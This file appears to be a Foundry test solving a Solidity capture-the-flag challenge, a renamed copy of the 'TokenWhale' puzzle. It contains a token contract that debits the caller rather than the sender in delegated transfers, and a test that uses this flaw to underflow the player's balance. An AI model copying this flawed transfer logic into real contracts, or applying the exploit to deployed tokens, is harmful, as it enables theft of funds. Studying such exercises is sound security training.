pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract ContractTest is Test {
    HealthtokenWhaleChallenge CoveragetokenWhaleChallengeContract;

    function testCalculation() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        CoveragetokenWhaleChallengeContract = new HealthtokenWhaleChallenge();
        CoveragetokenWhaleChallengeContract.CoveragetokenWhaleDeploy(address(this));
        console.log(
            "Player balance:",
            CoveragetokenWhaleChallengeContract.allowanceOf(address(this))
        );
        CoveragetokenWhaleChallengeContract.transferBenefit(address(alice), 800);

        vm.prank(alice);
        CoveragetokenWhaleChallengeContract.authorizeClaim(address(this), 1000);
        CoveragetokenWhaleChallengeContract.movecoverageFrom(
            address(alice),
            address(bob),
            500
        );

        console.log("operate completed, balance calculate");
        console.log(
            "Player balance:",
            CoveragetokenWhaleChallengeContract.allowanceOf(address(this))
        );
    }

    receive() external payable {}
}

contract HealthtokenWhaleChallenge {
    address player;

    uint256 public fundTotal;
    mapping(address => uint256) public allowanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function CoveragetokenWhaleDeploy(address _player) public {
        player = _player;
        fundTotal = 1000;
        allowanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return allowanceOf[player] >= 1000000;
    }

    event ShareBenefit(address indexed from, address indexed to, uint256 value);

    function _assigncredit(address to, uint256 value) internal {
        allowanceOf[msg.sender] -= value;
        allowanceOf[to] += value;

        emit ShareBenefit(msg.sender, to, value);
    }

    function transferBenefit(address to, uint256 value) public {
        require(allowanceOf[msg.sender] >= value);
        require(allowanceOf[to] + value >= allowanceOf[to]);

        _assigncredit(to, value);
    }

    event Approval(
        address indexed supervisor,
        address indexed spender,
        uint256 value
    );

    function authorizeClaim(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function movecoverageFrom(address from, address to, uint256 value) public {
        require(allowanceOf[from] >= value);
        require(allowanceOf[to] + value >= allowanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _assigncredit(to, value);
    }
}